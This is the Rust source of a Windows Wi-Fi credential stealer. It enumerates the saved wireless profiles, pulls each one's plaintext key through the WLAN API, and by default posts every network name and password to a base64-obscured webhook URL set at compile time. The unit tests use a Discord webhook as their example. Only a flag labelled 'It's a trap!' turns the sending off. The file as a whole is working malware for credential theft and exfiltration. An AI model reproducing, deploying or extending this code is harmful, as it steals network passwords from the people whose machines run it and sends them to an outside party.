#![cfg_attr(not(test), deny(clippy::unwrap_used, clippy::expect_used))]

use anyhow::{Context, Result};
use base64::{engine::general_purpose, Engine as _};
use clap::Parser;
use std::fs::File;
use std::io;
use std::io::Write;

const WEBHOOK_URL: &str = env!("WEBHOOK_URL", "WEBHOOK_URL must be set at compile time");

fn decode_webhook_url(webhook_url: &str) -> Result<String> {
    let decoded_bytes = general_purpose::STANDARD
        .decode(webhook_url)
        .context("Failed to decode base64 webhook URL")?;
    String::from_utf8(decoded_bytes).context("Webhook URL is not valid UTF-8")
}

async fn send_to_webhook(message: &str, webhook_url: &str) -> Result<()> {
    let client = reqwest::Client::new();
    let payload = serde_json::json!({
        "content": message
    });
    client
        .post(webhook_url)
        .json(&payload)
        .send()
        .await
        .context("Failed to send webhook request")?
        .error_for_status()
        .context("Webhook returned an error status")?;
    Ok(())
}

#[derive(Parser)]
#[command(version, about, long_about = None)]
struct Cli {
    /// Name of output file to save WiFi creds
    #[arg(short, long)]
    output: Option<String>,
    /// It's a trap!
    #[arg(short, long)]
    nosend: bool,
}

use std::{ffi::OsString, os::windows::ffi::OsStringExt};

use windows::{
    core::{GUID, HSTRING, PCWSTR, PWSTR},
    Data::Xml::Dom::{XmlDocument, XmlElement},
    Win32::{
        Foundation::{HANDLE, INVALID_HANDLE_VALUE, WIN32_ERROR},
        NetworkManagement::WiFi::{
            WlanCloseHandle, WlanEnumInterfaces, WlanFreeMemory, WlanGetProfile,
            WlanGetProfileList, WlanOpenHandle, WLAN_API_VERSION_2_0, WLAN_INTERFACE_INFO_LIST,
            WLAN_PROFILE_GET_PLAINTEXT_KEY, WLAN_PROFILE_INFO_LIST,
        },
    },
};

fn open_wlan_handle(api_version: u32) -> Result<HANDLE> {
    let mut negotiated_version = 0;
    let mut wlan_handle = INVALID_HANDLE_VALUE;

    let result = unsafe {
        WlanOpenHandle(
            api_version,
            None,
            &mut negotiated_version,
            &mut wlan_handle,
        )
    };

    WIN32_ERROR(result).ok().context("Failed to open WLAN handle")?;
    Ok(wlan_handle)
}

fn enum_wlan_interfaces(handle: HANDLE) -> Result<*mut WLAN_INTERFACE_INFO_LIST> {
    let mut interface_ptr = std::ptr::null_mut();

    let result = unsafe { WlanEnumInterfaces(handle, None, &mut interface_ptr) };

    WIN32_ERROR(result)
        .ok()
        .context("Failed to enumerate WLAN interfaces")?;
    Ok(interface_ptr)
}

fn grab_interface_profiles(
    handle: HANDLE,
    interface_guid: &GUID,
) -> Result<*const WLAN_PROFILE_INFO_LIST> {
    let mut wlan_profiles_ptr = std::ptr::null_mut();

    let result =
        unsafe { WlanGetProfileList(handle, interface_guid, None, &mut wlan_profiles_ptr) };

    WIN32_ERROR(result)
        .ok()
        .context("Failed to retrieve interface profile list")?;
    Ok(wlan_profiles_ptr)
}

fn parse_utf16_slice(string_slice: &[u16]) -> Option<OsString> {
    let null_index = string_slice.iter().position(|c| c == &0)?;
    Some(OsString::from_wide(&string_slice[..null_index]))
}

fn load_xml_document(xml: &OsString) -> Result<XmlDocument> {
    let xml_document = XmlDocument::new().context("Failed to create XmlDocument")?;
    xml_document
        .LoadXml(&HSTRING::from(xml))
        .context("Failed to load XML string into document")?;
    Ok(xml_document)
}

fn traverse_xml_tree(xml: &XmlElement, node_path: &[&str]) -> Option<String> {
    let mut subtree_list = xml.ChildNodes().ok()?;
    let last_node_name = node_path.last()?;

    'node_traverse: for node in node_path {
        let node_name = OsString::from_wide(&node.encode_utf16().collect::<Vec<u16>>());
        for subtree_value in &subtree_list {
            let element_name = match subtree_value.NodeName() {
                Ok(name) => name,
                Err(_) => continue,
            };

            if element_name.to_os_string() == node_name {
                if element_name.to_os_string().to_string_lossy().to_string()
                    == last_node_name.to_string()
                {
                    return Some(subtree_value.InnerText().ok()?.to_string());
                }

                subtree_list = subtree_value.ChildNodes().ok()?;
                continue 'node_traverse;
            }
        }
    }

    None
}

fn get_profiles_xml(
    handle: HANDLE,
    interface_guid: &GUID,
    profile_name: &OsString,
) -> Result<OsString> {
    let mut profile_xml_data = PWSTR::null();
    let mut profile_get_flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;

    let result = unsafe {
        WlanGetProfile(
            handle,
            interface_guid,
            PCWSTR(HSTRING::from(profile_name).as_ptr()),
            None,
            &mut profile_xml_data,
            Some(&mut profile_get_flags),
            None,
        )
    };

    WIN32_ERROR(result)
        .ok()
        .context("Failed to get profile XML")?;

    let xml_string = unsafe { profile_xml_data.to_hstring() };
    unsafe { WlanFreeMemory(profile_xml_data.as_ptr().cast()) };

    Ok(xml_string.to_os_string())
}

#[tokio::main]
async fn main() -> io::Result<()> {
    if let Err(e) = run().await {
        eprintln!("Error: {e:#}");
        std::process::exit(1);
    }
    Ok(())
}

async fn run() -> Result<()> {
    let cli = Cli::parse();

    let mut file = if let Some(ref output) = cli.output {
        println!("\nOutput file: {output}\n");
        Some(File::create(output).with_context(|| format!("Failed to create output file: {output}"))?)
    } else {
        None
    };

    let mut webhook_buf = if !cli.nosend {
        Some(String::new())
    } else {
        None
    };

    let wlan_handle = open_wlan_handle(WLAN_API_VERSION_2_0)?;

    let interface_ptr = match enum_wlan_interfaces(wlan_handle) {
        Ok(interfaces) => interfaces,
        Err(e) => {
            eprintln!("Failed to get wireless interfaces: {e:#}");
            unsafe { WlanCloseHandle(wlan_handle, None) };
            return Err(e);
        }
    };

    let interfaces_list = unsafe {
        std::slice::from_raw_parts(
            (*interface_ptr).InterfaceInfo.as_ptr(),
            (*interface_ptr).dwNumberOfItems as usize,
        )
    };

    for interface_info in interfaces_list {
        let _interface_description =
            match parse_utf16_slice(interface_info.strInterfaceDescription.as_slice()) {
                Some(name) => name,
                None => {
                    eprintln!("Could not parse interface description");
                    continue;
                }
            };

        let wlan_profile_ptr =
            match grab_interface_profiles(wlan_handle, &interface_info.InterfaceGuid) {
                Ok(profiles) => profiles,
                Err(e) => {
                    eprintln!("Failed to retrieve profiles: {e:#}");
                    continue;
                }
            };

        let wlan_profile_list = unsafe {
            std::slice::from_raw_parts(
                (*wlan_profile_ptr).ProfileInfo.as_ptr(),
                (*wlan_profile_ptr).dwNumberOfItems as usize,
            )
        };

        for profile in wlan_profile_list {
            let profile_name = match parse_utf16_slice(&profile.strProfileName) {
                Some(name) => name,
                None => {
                    eprintln!("Could not parse profile name");
                    continue;
                }
            };

            let profile_xml_data =
                match get_profiles_xml(wlan_handle, &interface_info.InterfaceGuid, &profile_name) {
                    Ok(data) => data,
                    Err(e) => {
                        eprintln!("Failed to extract XML data: {e:#}");
                        continue;
                    }
                };

            let xml_document = match load_xml_document(&profile_xml_data) {
                Ok(xml) => xml,
                Err(e) => {
                    eprintln!("Failed to load XML document: {e:#}");
                    continue;
                }
            };

            let root = match xml_document.DocumentElement() {
                Ok(root) => root,
                Err(e) => {
                    eprintln!("Failed to get document root: {e}");
                    continue;
                }
            };

            let auth_type = match traverse_xml_tree(
                &root,
                &["MSM", "security", "authEncryption", "authentication"],
            ) {
                Some(t) => t,
                None => {
                    eprintln!("Failed to get auth type for profile");
                    continue;
                }
            };

            let name_str = profile_name.to_string_lossy();

            let line = match auth_type.as_str() {
                "open" => format!("Wi-Fi Name: {name_str}, No password\n"),
                "WPA2" | "WPA2PSK" | "WPA3SAE" => {
                    if let Some(password) = traverse_xml_tree(
                        &root,
                        &["MSM", "security", "sharedKey", "keyMaterial"],
                    ) {
                        format!(
                            "Wi-Fi Name: {name_str}, Authentication: {auth_type}, Password: {password}\n"
                        )
                    } else {
                        eprintln!("Could not read password for {name_str}");
                        continue;
                    }
                }
                _ => format!("Wi-Fi Name: {name_str}, Authentication: {auth_type}\n"),
            };

            print!("{line}");

            if let Some(ref mut buf) = webhook_buf {
                buf.push_str(&line);
            }

            if let Some(ref mut f) = file {
                f.write_all(line.as_bytes())
                    .with_context(|| format!("Failed to write entry for {name_str}"))?;
            }
        }
        unsafe { WlanFreeMemory(wlan_profile_ptr as *mut _) };
    }

    if let Some(ref buf) = webhook_buf {
        let webhook_url = decode_webhook_url(WEBHOOK_URL)?;
        send_to_webhook(buf, &webhook_url)
            .await
            .context("Failed to send results to webhook")?;
    }

    unsafe { WlanFreeMemory(interface_ptr.cast()) };
    unsafe { WlanCloseHandle(wlan_handle, None) };

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::{engine::general_purpose, Engine as _};

    // decode_webhook_url tests

    #[test]
    fn decode_webhook_url_valid() {
        let url = "https://discord.com/api/webhooks/123/abc";
        let encoded = general_purpose::STANDARD.encode(url);
        let result = decode_webhook_url(&encoded).unwrap();
        assert_eq!(result, url);
    }

    #[test]
    fn decode_webhook_url_invalid_base64() {
        let result = decode_webhook_url("not!!valid==base64");
        assert!(result.is_err());
    }

    #[test]
    fn decode_webhook_url_invalid_utf8() {
        // Valid base64 but decodes to invalid UTF-8.
        let invalid_utf8 = general_purpose::STANDARD.encode(b"\xff\xfe");
        let result = decode_webhook_url(&invalid_utf8);
        assert!(result.is_err());
    }

    #[test]
    fn decode_webhook_url_empty() {
        // Empty string is valid base64 and decodes to an empty string.
        let result = decode_webhook_url("").unwrap();
        assert_eq!(result, "");
    }

    // parse_utf16_slice tests

    #[test]
    fn parse_utf16_slice_normal() {
        let mut buf: Vec<u16> = "hello".encode_utf16().collect();
        buf.push(0);
        let result = parse_utf16_slice(&buf).unwrap();
        assert_eq!(result.to_string_lossy(), "hello");
    }

    #[test]
    fn parse_utf16_slice_no_null_terminator() {
        let buf: Vec<u16> = "hello".encode_utf16().collect();
        let result = parse_utf16_slice(&buf);
        assert!(result.is_none());
    }

    #[test]
    fn parse_utf16_slice_empty() {
        // A slice with only a null terminator gives an empty string.
        let buf = vec![0u16];
        let result = parse_utf16_slice(&buf).unwrap();
        assert_eq!(result.to_string_lossy(), "");
    }

    #[test]
    fn parse_utf16_slice_null_at_start() {
        // Null before any data gives an empty string.
        let buf = vec![0u16, 'a' as u16, 'b' as u16];
        let result = parse_utf16_slice(&buf).unwrap();
        assert_eq!(result.to_string_lossy(), "");
    }
}
